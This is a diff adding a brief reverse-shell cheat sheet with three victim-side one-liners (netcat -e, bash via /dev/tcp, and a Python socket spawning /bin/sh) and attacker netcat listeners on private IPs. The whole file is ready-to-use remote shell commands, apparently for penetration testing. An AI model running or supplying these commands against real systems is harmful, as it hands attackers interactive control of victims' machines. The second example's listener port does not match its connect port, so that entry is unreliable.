@@ -1,0 +1,34 @@
+
+# Revers shells cheat-sheets
+# Reference:  http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+# 1)
+
+--- Victim: ---
+
+nc -e /bin/sh 10.6.0.100 53
+
+-- Attacker: ---
+
+nc -lvp 53
+
+# 2)
+
+--- Victim: ---
+
+bash -i >& /dev/tcp/192.168.29.31/2020 0>&1
+
+-- Attacker: ---
+
+nc -lvp 53
+
+# 3)
+
+--- Victim: ---
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.125",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+-- Attacker: ---
+
+nc -lvp 9000
